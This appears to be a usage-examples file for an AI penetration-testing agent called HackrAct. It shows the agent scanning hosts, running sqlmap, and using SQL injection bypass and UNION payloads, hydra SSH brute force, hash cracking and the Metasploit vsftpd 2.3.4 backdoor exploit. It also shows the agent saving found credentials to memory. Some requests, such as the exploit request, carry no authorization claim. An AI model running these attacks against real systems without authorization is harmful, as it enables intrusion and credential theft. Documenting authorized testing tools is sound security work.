# HackrAct AI Agent - Usage Examples

Practical examples of HackrAct in action for various penetration testing scenarios.

## 📋 Table of Contents

- [Network Reconnaissance](#network-reconnaissance)
- [Web Application Testing](#web-application-testing)
- [Password Attacks](#password-attacks)
- [Exploitation](#exploitation)
- [Memory Usage](#memory-usage)
- [Information Gathering](#information-gathering)

---

## 🌐 Network Reconnaissance

### Example 1: Basic Port Scan

**User Request:**
```
Scan 192.168.1.100 for open ports
```

**Agent Workflow:**
1. Uses `code_execution_tool` to run: `nmap -sV -sC 192.168.1.100`
2. Analyzes results
3. Saves critical findings to memory
4. Reports back with professional assessment

**Sample Response:**
```
Port scan completed on 192.168.1.100.

OPEN PORTS FOUND:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Port 22 (SSH)
 ├─ Service: OpenSSH 7.4
 ├─ Severity: Low
 └─ Note: Outdated version, consider updating

Port 80 (HTTP)
 ├─ Service: Apache 2.4.29
 ├─ Severity: Medium
 └─ Note: Known vulnerabilities in this version

Port 3306 (MySQL)
 ├─ Service: MySQL 8.0.32
 ├─ Severity: CRITICAL ⚠️
 └─ Issue: Database exposed remotely!

CRITICAL FINDING:
The MySQL port being exposed is a severe security risk.
An attacker could potentially:
- Brute force credentials
- Exploit known MySQL vulnerabilities
- Access sensitive data

RECOMMENDATIONS:
1. Bind MySQL to localhost only (edit my.cnf)
2. Implement firewall rules blocking external access
3. Update Apache to latest stable version
4. Schedule regular security updates

Finding saved to memory (ID: vuln_001)
```

### Example 2: Network Sweep

**User Request:**
```
Find all live hosts in 192.168.1.0/24 network
```

**Agent Actions:**
```bash
# Quick ping sweep
nmap -sn 192.168.1.0/24

# Then for each live host:
nmap -sV -sC <host>
```

---

## 🌐 Web Application Testing

### Example 3: SQL Injection Test

**User Request:**
```
Test http://testapp.local/login for SQL injection
```

**Agent Workflow:**
1. First does basic recon (nikto scan)
2. Identifies login form
3. Tests with sqlmap
4. Documents findings
5. Saves working payload to memory

**Commands Executed:**
```bash
# Initial scan
nikto -h http://testapp.local

# SQL injection test
sqlmap -u "http://testapp.local/login" \
  --forms \
  --batch \
  --level=3 \
  --risk=2
```

**Sample Finding:**
```
SQL INJECTION VULNERABILITY DISCOVERED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Target: http://testapp.local/login
Parameter: username
Type: Error-based SQL injection
Payload: username=admin' OR '1'='1' -- 

PROOF OF CONCEPT:
POST /login
username=admin' OR '1'='1' --
password=anything

Result: Authentication bypass successful

TECHNICAL DETAILS:
- Database: MySQL 5.7.29
- Backend: PHP 7.4
- Injection point: username parameter
- No input validation or prepared statements

IMPACT:
- Authentication bypass
- Possible database enumeration
- Potential data exfiltration
- Risk of database compromise

REMEDIATION:
1. Use prepared statements/parameterized queries
2. Implement input validation and sanitization
3. Apply principle of least privilege to DB user
4. Enable SQL query logging for monitoring
5. Consider implementing WAF rules

CVSS Score: 9.1 (Critical)

Exploit saved to memory for future reference.
```

### Example 4: Directory Enumeration

**User Request:**
```
Find hidden directories on http://target.com
```

**Agent Execution:**
```bash
gobuster dir \
  -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 \
  -x php,html,txt
```

---

## 🔐 Password Attacks

### Example 5: Hash Cracking

**User Request:**
```
I have a password hash: 5f4dcc3b5aa765d61d8327deb882cf99
Can you crack it?
```

**Agent Response:**
```
I'll attempt to crack this hash using multiple methods.

HASH ANALYSIS:
━━━━━━━━━━━━━━
Type: MD5 (32 characters, hexadecimal)
Hash: 5f4dcc3b5aa765d61d8327deb882cf99

METHOD 1: Online lookup (hash cracking databases)
Result: Hash found in database!
Plaintext: password

VERIFICATION:
echo -n "password" | md5sum
Output: 5f4dcc3b5aa765d61d8327deb882cf99 ✓

SECURITY ASSESSMENT:
- Extremely weak password
- MD5 is cryptographically broken
- No salting detected

RECOMMENDATIONS:
1. Enforce strong password policy (12+ chars, complexity)
2. Use bcrypt, Argon2, or PBKDF2 instead of MD5
3. Implement password salting
4. Enable multi-factor authentication
5. Conduct password security training
```

**With Hashfile:**
```
Crack the hashes in hashes.txt
```

**Commands:**
```bash
# Try John the Ripper with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# If unsuccessful, try hashcat with rules
hashcat -m 0 -a 0 hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

### Example 6: SSH Brute Force

**User Request:**
```
Test SSH on 192.168.1.50 for weak credentials (authorized test)
```

**Agent Execution:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.50 \
  -t 4 \
  -V
```

---

## 💥 Exploitation

### Example 7: Metasploit Usage

**User Request:**
```
Search for exploits for vsftpd 2.3.4 and attempt exploitation
```

**Agent Workflow:**
```bash
# Search exploitdb
searchsploit vsftpd 2.3.4

# Search metasploit
msfconsole -x "search vsftpd 2.3.4; exit"

# Use the backdoor exploit
msfconsole -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOST 192.168.1.100;
set RPORT 21;
exploit;
"
```

**Sample Report:**
```
EXPLOITATION SUCCESSFUL
━━━━━━━━━━━━━━━━━━━━━

Target: 192.168.1.100:21
Service: vsftpd 2.3.4
Exploit: Backdoor Command Execution
Module: exploit/unix/ftp/vsftpd_234_backdoor

EXECUTION:
Used Metasploit Framework to exploit known
backdoor in vsftpd version 2.3.4

Result: Shell access obtained as root

POST-EXPLOITATION:
- Privilege level: root (UID 0)
- OS: Linux 2.6.32
- Hostname: victim-box

IMPACT:
Complete system compromise achieved.
Attacker has full control over the system.

REMEDIATION: URGENT
1. Immediately update vsftpd to latest version
2. Review system for signs of compromise
3. Change all passwords
4. Audit all system accounts
5. Check for persistence mechanisms
```

---

## 🧠 Memory Usage

### Example 8: Saving and Recalling Exploits

**Saving:**
```
👤 You: Save that SQL injection exploit

🛡️ HackrAct: I'll save this exploit to memory.

[Saves to memory]
Content: SQL injection in /login.php - payload: admin' OR '1'='1' --
Category: exploit
Tags: sqli, authentication-bypass, web

Memory saved (ID: exp_12345)
```

**Recalling:**
```
👤 You: What SQL injections have we found before?

🛡️ HackrAct: Let me search my memory...

[Recalls from memory]

Found 3 relevant exploits:

1. SQL Injection - Login Bypass
   Target: testapp.local/login
   Payload: admin' OR '1'='1' --
   Date: 2025-11-20
   
2. SQL Injection - Union-based
   Target: shop.local/products.php?id=1
   Payload: 1' UNION SELECT NULL,username,password FROM users--
   
3. Blind SQL Injection
   Target: api.target.com/search
   Method: Time-based
   Payload: ' AND SLEEP(5)--
```

### Example 9: Saving Credentials

```
[Agent finds credentials during assessment]

🛡️ HackrAct: Found credentials in config file!

Username: dbadmin
Password: P@ssw0rd123!
Service: MySQL

Saving to memory for reference...

[Saved as: category=credential, tags=[mysql, dbadmin]]
```

---

## 🔍 Information Gathering

### Example 10: CVE Lookup

**User Request:**
```
Find vulnerabilities for Apache 2.4.29
```

**Agent Response:**
```
Searching for Apache 2.4.29 vulnerabilities...

KNOWN VULNERABILITIES:
━━━━━━━━━━━━━━━━━━━━━

CVE-2019-0211 (CRITICAL)
├─ CVSS: 10.0
├─ Type: Privilege Escalation
├─ Impact: Local attacker can execute arbitrary code as root
└─ Fix: Upgrade to 2.4.39+

CVE-2019-0215 (Medium)
├─ CVSS: 6.0
├─ Type: Cross-Site Scripting
└─ Fix: Upgrade to 2.4.39+

CVE-2018-1312 (Medium)
├─ CVSS: 5.9
├─ Type: Authentication bypass
└─ Fix: Update to 2.4.34+

RECOMMENDATION:
Immediate upgrade to Apache 2.4.41 or later required.
The privilege escalation vulnerability is especially critical.

Would you like me to search for available exploits?
```

### Example 11: OSINT / Reconnaissance

**User Request:**
```
Gather information about example.com
```

**Agent Actions:**
```bash
# DNS enumeration
dig example.com ANY
whois example.com

# Subdomain discovery
subfinder -d example.com

# Tech stack detection
whatweb http://example.com

# Certificate transparency logs
curl "https://crt.sh/?q=%.example.com&output=json"
```

---

## 🎯 Complete Engagement Example

### Example 12: Full Penetration Test

**User Request:**
```
Perform a penetration test on 192.168.1.100 (authorized)
```

**Agent Workflow:**

```
PHASE 1: RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━
[Running: nmap -sn 192.168.1.100]
Host is up - proceeding with port scan

PHASE 2: SCANNING
━━━━━━━━━━━━━━━
[Running: nmap -sV -sC -p- 192.168.1.100]
Found services:
- SSH (22)
- HTTP (80)
- MySQL (3306)

PHASE 3: ENUMERATION
━━━━━━━━━━━━━━━━━━━
[Enumerating web service]
[Running: nikto -h http://192.168.1.100]
[Running: gobuster dir...]

PHASE 4: VULNERABILITY ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Identified:
1. Outdated Apache version
2. MySQL exposed remotely
3. SQL injection in login form

PHASE 5: EXPLOITATION
━━━━━━━━━━━━━━━━━━━
[Attempting SQL injection]
Success! Authentication bypassed

PHASE 6: POST-EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━
[Attempting privilege escalation]
[Checking for sensitive data]

PHASE 7: REPORTING
━━━━━━━━━━━━━━━━━
Generating comprehensive report...
Saving all findings to memory...
```

**Final Report:**
```
PENETRATION TEST REPORT
Target: 192.168.1.100
Date: 2025-11-20
Tester: HackrAct AI Agent

EXECUTIVE SUMMARY:
━━━━━━━━━━━━━━━━━
The target system has critical vulnerabilities that
require immediate attention. Successfully achieved
unauthorized access through SQL injection.

FINDINGS:
━━━━━━━━

[CRITICAL] SQL Injection - Login Form
- Allows authentication bypass
- Potential data exfiltration
- CVSS: 9.1

[CRITICAL] Exposed MySQL Database
- Remote access enabled
- No firewall protection
- CVSS: 9.0

[HIGH] Outdated Apache Web Server
- Version 2.4.29
- Multiple known CVEs
- CVSS: 7.8

[MEDIUM] SSH with Weak Configuration
- Allows password authentication
- No rate limiting
- CVSS: 5.3

REMEDIATION PRIORITY:
1. Fix SQL injection (URGENT)
2. Restrict MySQL access (URGENT)
3. Update Apache (HIGH)
4. Harden SSH config (MEDIUM)

All findings saved to memory.
Detailed technical documentation available.
```

---

## 💡 Tips for Effective Use

1. **Be Specific**: "Scan port 80" vs "Check for vulnerabilities"
2. **Iterative Approach**: Start broad, then focus on findings
3. **Save Important Findings**: Use memory for future reference
4. **Combine Tools**: Agent will use multiple tools as needed
5. **Review Memory**: Check what's been found before repeating work

## ⚖️ Legal Reminder

All examples assume **authorized testing** on systems you own or have written permission to test.

**Never use these techniques on systems without authorization!**

---

For more information, see the main [README.md](README.md)
